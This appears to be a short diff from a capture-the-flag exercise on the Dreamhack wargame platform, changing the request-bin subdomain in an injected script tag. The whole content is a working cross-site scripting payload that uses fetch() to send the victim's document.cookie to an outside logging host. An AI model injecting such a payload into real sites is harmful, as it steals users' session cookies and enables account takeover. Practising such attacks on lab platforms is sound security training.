@@ -1,3 +1,3 @@
 <script>
-  fetch("https://ljrzvdy.request.dreamhack.games/log?cookie=" + encodeURIComponent(document.cookie));
+  fetch("https://glbesok.request.dreamhack.games/log?cookie=" + encodeURIComponent(document.cookie));
 </script>
